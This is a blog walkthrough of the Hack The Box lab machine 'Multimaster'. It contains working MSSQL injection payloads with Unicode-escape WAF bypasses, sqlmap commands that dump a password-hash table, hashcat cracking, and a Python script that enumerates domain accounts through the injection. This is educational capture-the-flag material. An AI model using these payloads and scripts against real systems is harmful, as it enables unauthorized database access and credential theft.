---
title: Multimaster
date: 2026-05-13
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - windows
  - Insane
  - Port53-DNS-Discovery-Host
  - Port139-135-SMB-Anonymous-Login-Failed
  - Port139-135-SMB-Rid-Brute-Failed
  - OWASP-SQL-Inject-search-func-mssql
lastmod: 2026-05-14T06:49:27.110Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Multimaster" >}}

***

# Recon

### \[\[PORT & IP SCAN]]

summary the openport only with One-Paragraph -- AI

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T 3     10.129.95.200  -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-12 23:27 -0400
Nmap scan report for 10.129.95.200
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-13 03:34:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-13T03:35:58+00:00; +7m00s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2026-05-13T03:35:18+00:00
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2026-05-12T02:44:47
|_Not valid after:  2026-11-11T02:44:47
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2026-05-12T20:35:22-07:00
|_clock-skew: mean: 1h31m01s, deviation: 3h07m52s, median: 6m59s
| smb2-time: 
|   date: 2026-05-13T03:35:22
|_  start_date: 2026-05-13T02:44:56
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.40 seconds
                                                                   
```

### DNS 53

{{< toggle "Tag 🏷️" >}}

{{< tag "Port53-DNS-Discovery-Host" >}} Discovering the DNS 53 port , using the netexec nxc 's --generate-hosts-file to generate the hosts file and put into the /etc/hosts

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc smb 10.129.95.200   --generate-hosts-file  hosts
SMB         10.129.95.200   445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# cat hosts       
10.129.95.200     MULTIMASTER.MEGACORP.LOCAL MEGACORP.LOCAL MULTIMASTER
```

```
┌──(root㉿kali)-[~/Desktop]
└─# cat /etc/hosts    
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.95.200     MULTIMASTER.MEGACORP.LOCAL MEGACORP.LOCAL MULTIMASTER


# Added by Docker Desktop
# To allow the same kube context to work on the host and the container:
127.0.0.1       kubernetes.docker.internal
# End of section
```

### SMB 445

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-Anonymous-Login-Failed" >}} Failed login with Anonymous with Connection Error: The NETBIOS connection with the remote host timed out.

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.95.200   -u 'guest' -p '' --shares
SMB         10.129.95.200   445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:True)
SMB         10.129.95.200   445    NONE             [-] Connection Error: The NETBIOS connection with the remote host timed out.

```

### SMB RID

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-Rid-Brute-Failed" >}} Failed rid brute force with STATUS\_ACCOUNT\_DISABLED

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.95.200   -u 'guest' -p '' --rid-brute 
SMB         10.129.95.200   445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\guest: STATUS_ACCOUNT_DISABLED 

```

### Port 80 Web

### Tech stack

{{< tech-stack >}}

Vue.js\
Web Server: Apache/2.4.52\
windows IIS

{{< /tech-stack >}}

In the http://10.129.95.200/#/app that has the search function , I will throw it in browser

sql inject

{{< toggle "Tag 🏷️" >}}

{{< tag "OWASP-SQL-Inject-search-func-mssql" >}} Discovering the web page and found the search function with WAF firewall protect , after fuzzing , knowing the special chars with unicode escape sequences can bypass it , so using the union attack to get Domain , Domain RID and User RID by mssql , and using sqlmap to dump the password tables with hashcat to decode the valid password.

{{< /toggle >}}

Here is the list for detect the sql  --

#### Fuzzing with special chars

1. `a` is the search keyword for having the result of search function

![Pasted image 20260513131537.png](/ob/Pasted%20image%2020260513131537.png)

2. On Top that adding the special characters for triggering like the server error by using the fuzzing and bypass the white list

Only Character

```
~
!
@
#
$
%
^
&
*
(
)
-
_
+
=
{
}
]
[
|
\
`
,
.
/
?
;
:
'
"
<
>
```

ASCII hex

```
\u7E
\u21
\u40
\u24
\u25
\u5E
\u26
\u28
\u29
\u5F
\u3D
\u7B
\u7D
\u5D
\u5B
\u7C
\u60
\u2C
\u2E
\u2F
\u3F
\u3B
\u3A
\u27
\u22
\u3C
```

Unicode escape sequences

```
\u007E
\u0021
\u0040
\u0024
\u0025
\u005E
\u0026
\u0028
\u0029
\u005F
\u003D
\u007B
\u007D
\u005D
\u005B
\u007C
\u0060
\u002C
\u002E
\u002F
\u003F
\u003B
\u003A
\u0027
\u0022
\u003C
```

Simple characters encoded

```
%21
%40
%23
%24
%25
%5E
%26
%2A
%28
%29
%2B
%3D
%7B
%7D
%5D
%5B
%7C
%5C
%60
%2C
%2F
%3F
%3B
%3A
%27
%22
%3C
%3E
```

Multiple encoding

```
2521%
2540%
2523%
2524%
2525%
%255E
2526%
%252A
2528%
2529%
%252B
%253D
%257B
%257D
%255D
%255B
%257C
%255C
2560%
%252C
%252F  252F
%253F
%253B
%253A
2527%
2522%
%253C
%253E
```

#### Get different Respond

After the fuzzing the special chars , we will know which encoding method is allow to bypass the firewall , In the result the `\u0027` will return the `null` , and the `\` and `\u27` only return the `error has occurred` that mean we can use the Unicode escape sequences to bypass

work on \\

![Pasted image 20260513133601.png](/ob/Pasted%20image%2020260513133601.png)

Also work on `\u27`\
![Pasted image 20260513134905.png](/ob/Pasted%20image%2020260513134905.png)

![Pasted image 20260513141255.png](/ob/Pasted%20image%2020260513141255.png)

That is a good sign there’s SQL injection, even if blind.

#### Unicode escape sequences bypass with union attack

Change to the payload to Unicode due to the \u002d has the response of null , so modifying the payload to Unicode, and we can use the cyberchef https://gchq.github.io/CyberChef/ to help us to encode.

![Pasted image 20260514135426.png](/ob/Pasted%20image%2020260514135426.png)

```
a' --
```

\u002d is the `-`

\u0027 is the `'`

![Pasted image 20260513142222.png](/ob/Pasted%20image%2020260513142222.png)

analysis : return the `[ ]` is mean the `--` comment is successful as we dont have any error ,

In Case , we use the normal request , that will be block

![Pasted image 20260513142552.png](/ob/Pasted%20image%2020260513142552.png)

Therefore, in this step , we need to bypass the firewall to make our payload successful inject in somehow way without error. We can go forward to the union attack

#### union attack know how many null

Try the union inject with encode payload, after testing , the 1,2,3,4,5 will has the response, and  use the loop to do it , but use the manual will be more aceturate will not not block by firewall

![Pasted image 20260514141439.png](/ob/Pasted%20image%2020260514141439.png)

```
a' union select 1,2,3,4,5 -- -
a' union select null,null,null,null,null -- -
```

![Pasted image 20260514143338.png](/ob/Pasted%20image%2020260514143338.png)

#### identify database

Abusing the union attack to know what database is using

using the the list to check

```
@@version
version()
* FROM v$version
```

version()\
![Pasted image 20260513150823.png](/ob/Pasted%20image%2020260513150823.png)

* FROM v\$version

![Pasted image 20260513150857.png](/ob/Pasted%20image%2020260513150857.png)\
@@version\
![Pasted image 20260513150800.png](/ob/Pasted%20image%2020260513150800.png)

now we can ensure that the database is `Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) \n\tAug 22 2017 17:04:49 \n\tCopyright (C) 2017 Microsoft Corporation\n\tStandard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)\n`

#### pentestmonkey 's inject cheatsheat

so we can use the mssql command

Ref : https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

whoami : I am called to finder

![Pasted image 20260513151543.png](/ob/Pasted%20image%2020260513151543.png)

Using Database is `Hub_DB`

![Pasted image 20260513151811.png](/ob/Pasted%20image%2020260513151811.png)

what I need to do here , I noted there is the login function , so I should get the user and password form the database

I would like to know what table in

#### Dump the table with sqlmap

```
┌──(root㉿kali)-[~/Desktop]
└─# sqlmap -r colleagues.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080 --dump-all --exclude-sysdbs
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[']_____ ___ ___  {1.10#stable}                                                                                                                                                                                                     
|_ -| . [(]     | .'| . |                                                                                                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:58:54 /2026-05-13/

[04:58:54] [INFO] parsing HTTP request from 'colleagues.request'

(custom) POST parameter 'JSON name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 398 HTTP(s) requests:
---
Parameter: JSON name ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: {"name":"a\u0027 \u0075nion se\u006cect 1,2,3,DB_NAME(),null\u002d\u002d \u002d' OR NOT 5262=5262-- xhfP"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: {"name":"a\u0027 \u0075nion se\u006cect 1,2,3,DB_NAME(),null\u002d\u002d \u002d' UNION ALL SELECT 84,84,84,84,CONCAT(CONCAT('qpzjq','LGufsErCBUXLKkYKTRWPbTHkIfNCvwpaXHXVkfoy'),'qxpvq')-- qGfH"}
---
[21:52:17] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[21:52:17] [INFO] testing MySQL
[21:52:31] [WARNING] the back-end DBMS is not MySQL
[21:52:31] [INFO] testing Oracle
[21:52:37] [WARNING] the back-end DBMS is not Oracle
[21:52:37] [INFO] testing PostgreSQL
[21:52:43] [WARNING] the back-end DBMS is not PostgreSQL
[21:52:43] [INFO] testing Microsoft SQL Server
[21:52:51] [INFO] confirming Microsoft SQL Server
[21:53:30] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 2016 or 2019 or 2022 or 11
web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET
back-end DBMS: Microsoft SQL Server 2017
[21:53:30] [INFO] sqlmap will dump entries of all tables from all databases now
[21:53:30] [INFO] fetching database names
[21:53:36] [INFO] fetching tables for databases: Hub_DB, [master], model, msdb, tempdb
[21:54:07] [INFO] skipping system database 'tempdb'
[21:54:07] [INFO] skipping system database 'msdb'
[21:54:07] [INFO] skipping system database 'model'
[21:54:07] [INFO] fetching columns for table 'Colleagues' in database 'Hub_DB'
[21:54:12] [INFO] fetching entries for table 'Colleagues' in database 'Hub_DB'
Database: Hub_DB
Table: Colleagues
[17 entries]
+----+----------------------+-------------+----------------------+----------------------+
| id | email                | image       | name                 | position             |
+----+----------------------+-------------+----------------------+----------------------+
| 1  | sbauer@megacorp.htb  | sbauer.jpg  | Sarina Bauer         | Junior Developer     |
| 2  | okent@megacorp.htb   | okent.jpg   | Octavia Kent         | Senior Consultant    |
| 3  | ckane@megacorp.htb   | ckane.jpg   | Christian Kane       | Assistant Manager    |
| 4  | kpage@megacorp.htb   | kpage.jpg   | Kimberly Page        | Financial Analyst    |
| 5  | shayna@megacorp.htb  | shayna.jpg  | Shayna Stafford      | HR Manager           |
| 6  | james@megacorp.htb   | james.jpg   | James Houston        | QA Lead              |
| 7  | cyork@megacorp.htb   | cyork.jpg   | Connor York          | Web Developer        |
| 8  | rmartin@megacorp.htb | rmartin.jpg | Reya Martin          | Tech Support         |
| 9  | zac@magacorp.htb     | zac.jpg     | Zac Curtis           | Junior Analyst       |
| 10 | jorden@megacorp.htb  | jorden.jpg  | Jorden Mclean        | Full-Stack Developer |
| 11 | alyx@megacorp.htb    | alyx.jpg    | Alyx Walters         | Automation Engineer  |
| 12 | ilee@megacorp.htb    | ilee.jpg    | Ian Lee              | Internal Auditor     |
| 13 | nbourne@megacorp.htb | nbourne.jpg | Nikola Bourne        | Head of Accounts     |
| 14 | zpowers@megacorp.htb | zpowers.jpg | Zachery Powers       | Credit Analyst       |
| 15 | aldom@megacorp.htb   | aldom.jpg   | Alessandro Dominguez | Senior Web Developer |
| 16 | minato@megacorp.htb  | minato.jpg  | MinatoTW             | CEO                  |
| 17 | egre55@megacorp.htb  | egre55.jpg  | egre55               | CEO                  |
+----+----------------------+-------------+----------------------+----------------------+

[21:54:20] [INFO] table 'Hub_DB.dbo.Colleagues' dumped to CSV file '/root/.local/share/sqlmap/output/10.129.95.200/dump/Hub_DB/Colleagues.csv'
[21:54:20] [INFO] fetching columns for table 'Logins' in database 'Hub_DB'
[21:54:26] [INFO] fetching entries for table 'Logins' in database 'Hub_DB'
[21:54:32] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[21:54:32] [INFO] using hash method 'sha384_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[21:54:32] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[21:54:32] [INFO] starting dictionary-based cracking (sha384_generic_passwd)
[21:54:32] [INFO] starting 8 processes 
[21:54:41] [WARNING] no clear password(s) found                                                                                                                                                                                            
Database: Hub_DB
Table: Logins
[17 entries]
+----+--------------------------------------------------------------------------------------------------+----------+
| id | password                                                                                         | username |
+----+--------------------------------------------------------------------------------------------------+----------+
| 1  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | sbauer   |
| 2  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | okent    |
| 3  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ckane    |
| 4  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | kpage    |
| 5  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | shayna   |
| 6  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | james    |
| 7  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | cyork    |
| 8  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | rmartin  |
| 9  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zac      |
| 10 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | jorden   |
| 11 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | alyx     |
| 12 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ilee     |
| 13 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | nbourne  |
| 14 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zpowers  |
| 15 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | aldom    |
| 16 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | minatotw |
| 17 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | egre55   |
+----+--------------------------------------------------------------------------------------------------+----------+

[21:54:41] [INFO] table 'Hub_DB.dbo.Logins' dumped to CSV file '/root/.local/share/sqlmap/output/10.129.95.200/dump/Hub_DB/Logins.csv'
[21:54:41] [INFO] fetching columns for table 'INFORMATION_SCHEMA.CHECK_CONSTRAINTS' in database 'master'
[21:54:52] [INFO] fetching entries for table 'INFORMATION_SCHEMA.CHECK_CONSTRAINTS' in database 'master'
[21:55:03] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[21:55:16] [INFO] fetching number of entries for table 'INFORMATION_SCHEMA.CHECK_CONSTRAINTS' in database 'master'
[21:55:16] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[21:55:16] [INFO] retrieved: 0
[21:56:18] [WARNING] table 'INFORMATION_SCHEMA.CHECK_CONSTRAINTS' in database 'master' appears to be empty
Database: master
Table: INFORMATION_SCHEMA.CHECK_CONSTRAINTS
[0 entries]
+-----------+-----------+--------------+------------------+------------------+--------+--------+-----------+-------------+-------------+-------------+--------------+--------------+--------------+---------------+----------------+-----------------+-------------------+---------------------+---------------------+----------------------+------------------------+-------------------------+
| object_id | schema_id | principal_id | parent_column_id | parent_object_id | name   | type   | type_desc | create_date | is_disabled | modify_date | CHECK_CLAUSE | definition   | is_published | is_ms_shipped | is_not_trusted | is_system_named | CONSTRAINT_NAME   | CONSTRAINT_SCHEMA   | is_schema_published | CONSTRAINT_CATALOG   | is_not_for_replication | uses_database_collation |
+-----------+-----------+--------------+------------------+------------------+--------+--------+-----------+-------------+-------------+-------------+--------------+--------------+--------------+---------------+----------------+-----------------+-------------------+---------------------+---------------------+----------------------+------------------------+-------------------------+
+-----------+-----------+--------------+------------------+------------------+--------+--------+-----------+-------------+-------------+-------------+--------------+--------------+--------------+---------------+----------------+-----------------+-------------------+---------------------+---------------------+----------------------+------------------------+-------------------------+

[21:56:18] [INFO] table '[master].INFORMATION_SCHEMA.CHECK_CONSTRAINTS' dumped to CSV file '/root/.local/share/sqlmap/output/10.129.95.200/dump/master/INFORMATION_SCHEMA.CHECK_CONSTRAINTS.csv'
[21:56:18] [INFO] fetching columns for table 'INFORMATION_SCHEMA.COLUMNS' in database 'master'
[21:56:24] [INFO] fetching entries for table 'INFORMATION_SCHEMA.COLUMNS' in database 'master'

```

The `sqlmap` automated cracker didn’t break any of the hashes, but it uses a limited wordlist. Given the length of the hash, it looks like SHA-384. When I ran `hashcat` with `-m 10800` for SHA-384 with `rockyou.txt`, nothing broke. There’s two other formats on the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page - SHA3-384 (`-m 17500`) and Keccak-384 (`-m 17900`). When I ran with the latter, I got results:

```
root@kali# hashcat -m 17900 hashes /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...
...[snip]...
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
Approaching final keyspace - workload adjusted.  
...[snip]...
```

While there’s a bunch of users in the database, there were only four unique passwords, and three broke with `rockyou.txt`:

| Password  | Users                                       |
| --------- | ------------------------------------------- |
| password1 | sbauer, shayna, james, cyork, jorden, aldom |
| finance1  | ckane, kpage, zac, ilee, zpowers            |
| banking1  | okent, rmartin, alyx, nbourne               |
| ?         | minatotw, egre55                            |

#### Get Default Domain

First step is to get the domain name with `SELECT DEFAULT_DOMAIN()`. I can just replace all the static `CHAR` with that query to get:

like that

![Pasted image 20260514103637.png](/ob/Pasted%20image%2020260514103637.png)

The domain is `MEGACORP`

![Pasted image 20260514103729.png](/ob/Pasted%20image%2020260514103729.png)

#### Get a Domain RID

Now I need to get a domain RID using the `SUSER_SID` function on a known group (I’ll use `MEGACORP/Domain Admins`):

```
a' UNION ALL SELECT 58,58,58,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),58-- gxQm
```

```
\u0061\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0041\u004C\u004C\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0035\u0038\u002C\u0035\u0038\u002C\u0035\u0038\u002C\u006D\u0061\u0073\u0074\u0065\u0072\u002E\u0064\u0062\u006F\u002E\u0066\u006E\u005F\u0076\u0061\u0072\u0062\u0069\u006E\u0074\u006F\u0068\u0065\u0078\u0073\u0074\u0072\u0028\u0053\u0055\u0053\u0045\u0052\u005F\u0053\u0049\u0044\u0028\u0027\u004D\u0045\u0047\u0041\u0043\u004F\u0052\u0050\u005C\u0044\u006F\u006D\u0061\u0069\u006E\u0020\u0041\u0064\u006D\u0069\u006E\u0073\u0027\u0029\u0029\u002C\u0035\u0038\u002D\u002D\u0020\u0067\u0078\u0051\u006D
```

0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000

#### Build a User RID

![Pasted image 20260514111614.png](/ob/Pasted%20image%2020260514111614.png)

I know the default administrator is RID 500. So I can make this RID by taking 500, converting to hex (0x1f4), padding it to 4 bytes (0x000001f4), and reversing the byte order (0xf4010000). So the administrator RID should be `0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000`. To check, I’ll run `SUSER_SNAME`:

I’ll need a script to brute force across the possible SIDs that could be in use by users. What I came up with was this:

{{< code >}}\
\#!/usr/bin/env python3

import binascii\
import requests\
import struct\
import sys\
import time

payload\_template = """test' UNION ALL SELECT 58,58,58,{},58-- -"""

def unicode\_escape(s):\
return "".join(\[r"\u{:04x}".format(ord(c)) for c in s])

def issue\_query(sql):\
while True:\
resp = requests.post(\
"http://10.10.10.179/api/getColleagues",\
data='{"name":"' + unicode\_escape(payload\_template.format(sql)) + '"}',\
headers={"Content-type": "text/json; charset=utf-8"},\
proxies={"http": "http://127.0.0.1:8080"},\
)\
if resp.status\_code != 403:\
break\
sys.stdout.write("\r\[-] Triggered WAF. Sleeping for 30 seconds")\
time.sleep(30)\
return resp.json()\[0]\["email"]

print("\[\*] Finding domain")\
domain = issue\_query("DEFAULT\_DOMAIN()")\
print(f"\[+] Found domain: {domain}")

print("\[\*] Finding Domain SID")\
sid = issue\_query(f"master.dbo.fn\_varbintohexstr(SUSER\_SID('{domain}\Domain Admins'))")\[:-8]\
print(f"\[+] Found SID for {domain} domain: {sid}")

for i in range(500, 10500):\
sys.stdout.write(f"\r\[\*] Checking SID {i}" + " " \* 50)\
num = binascii.hexlify(struct.pack("\<I", i)).decode()\
acct = issue\_query(f"SUSER\_SNAME({sid}{num})")\
if acct:\
print(f"\r\[+] Found account \[{i:05d}]  {acct}" + " " \* 30)\
time.sleep(1)

print("\r" + " " \* 50)\
{{< /code >}}

The WAF has some kind of dumb rate limiting. I think it’s looking at requests over some time period and returning 403 if there are too many. I just have a loop that sleeps for 30 seconds and tries again if there’s a 403. The current parameters are to sleep 30 seconds on a 403, and 1 second between requests. It’s possible those could be optimized.

Getting Python to actually send `\u0027` was tricker than I expected. I originally was doing `json={"name":""}` in the POST, but Python is too nice about formatting that. Changing it to `data` and setting it the way I have above took some trial and error through the proxy.

Sending through Burp was really nice, and it didn’t really slow anything down since I was already going slow for the WAF.

```
root@kali# ./get_domain_users.py 
[*] Finding domain
[+] Found domain: MEGACORP
[*] Finding Domain SID
[+] Found SID for MEGACORP domain: 0x0105000000000005150000001c00d1bcd181f1492bdfc236
[+] Found account [00500]  MEGACORP\Administrator                              
[+] Found account [00501]  MEGACORP\Guest                              
[+] Found account [00502]  MEGACORP\krbtgt                              
[+] Found account [00503]  MEGACORP\DefaultAccount                              
[+] Found account [00512]  MEGACORP\Domain Admins                              
[+] Found account [00513]  MEGACORP\Domain Users                              
[+] Found account [00514]  MEGACORP\Domain Guests                              
[+] Found account [00515]  MEGACORP\Domain Computers                              
[+] Found account [00516]  MEGACORP\Domain Controllers                              
[+] Found account [00517]  MEGACORP\Cert Publishers                              
[+] Found account [00518]  MEGACORP\Schema Admins                              
[+] Found account [00519]  MEGACORP\Enterprise Admins                              
[+] Found account [00520]  MEGACORP\Group Policy Creator Owners                              
[+] Found account [00521]  MEGACORP\Read-only Domain Controllers                              
[+] Found account [00522]  MEGACORP\Cloneable Domain Controllers                              
[+] Found account [00525]  MEGACORP\Protected Users                              
[+] Found account [00526]  MEGACORP\Key Admins                              
[+] Found account [00527]  MEGACORP\Enterprise Key Admins                              
[+] Found account [00553]  MEGACORP\RAS and IAS Servers                              
[+] Found account [00571]  MEGACORP\Allowed RODC Password Replication Group                              
[+] Found account [00572]  MEGACORP\Denied RODC Password Replication Group                              
[+] Found account [01000]  MEGACORP\MULTIMASTER$                              
[+] Found account [01101]  MEGACORP\DnsAdmins                              
[+] Found account [01102]  MEGACORP\DnsUpdateProxy                              
[+] Found account [01103]  MEGACORP\svc-nas                              
[+] Found account [01105]  MEGACORP\Privileged IT Accounts                              
[+] Found account [01110]  MEGACORP\tushikikatomo                              
[+] Found account [01111]  MEGACORP\andrew                              
[+] Found account [01112]  MEGACORP\lana                               
[+] Found account [01601]  MEGACORP\alice                              
[+] Found account [01602]  MEGACORP\test                               
[+] Found account [02101]  MEGACORP\dai                                
[+] Found account [02102]  MEGACORP\svc-sql                              
[+] Found account [03101]  MEGACORP\SQLServer2005SQLBrowserUser$MULTIMASTER                              
[+] Found account [03102]  MEGACORP\sbauer                              
[+] Found account [03103]  MEGACORP\okent                              
[+] Found account [03104]  MEGACORP\ckane                              
[+] Found account [03105]  MEGACORP\kpage                              
[+] Found account [03106]  MEGACORP\james                              
[+] Found account [03107]  MEGACORP\cyork                              
[+] Found account [03108]  MEGACORP\rmartin                              
[+] Found account [03109]  MEGACORP\zac                                
[+] Found account [03110]  MEGACORP\jorden                              
[+] Found account [03111]  MEGACORP\alyx                               
[+] Found account [03112]  MEGACORP\ilee                               
[+] Found account [03113]  MEGACORP\nbourne                              
[+] Found account [03114]  MEGACORP\zpowers                              
[+] Found account [03115]  MEGACORP\aldom                              
[+] Found account [03116]  MEGACORP\jsmmons                              
[+] Found account [03117]  MEGACORP\pmartin                              
[+] Found account [03119]  MEGACORP\Developers
```

Users.txt

```
┌──(root㉿kali)-[~/Desktop]
└─# awk -F'\\\\' '/MEGACORP/ {gsub(/\[.*\]/,"",$2); print $2}' tmp.txt | sort -u > users.txt
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# cat users.txt 

Administrator                              
aldom                              
alice                              
Allowed RODC Password Replication Group                              
alyx                               
andrew                              
Cert Publishers                              
ckane                              
Cloneable Domain Controllers                              
cyork                              
dai                                
DefaultAccount                              
Denied RODC Password Replication Group                              
Developers
DnsAdmins                              
DnsUpdateProxy                              
Domain Admins                              
Domain Computers                              
Domain Controllers                              
Domain Guests                              
Domain Users                              
Enterprise Admins                              
Enterprise Key Admins                              
Group Policy Creator Owners                              
Guest                              
ilee                               
james                              
jorden                              
jsmmons                              
Key Admins                              
kpage                              
krbtgt                              
lana                               
MULTIMASTER$                              
nbourne                              
okent                              
pmartin                              
Privileged IT Accounts                              
Protected Users                              
RAS and IAS Servers                              
Read-only Domain Controllers                              
rmartin                              
sbauer                              
Schema Admins                              
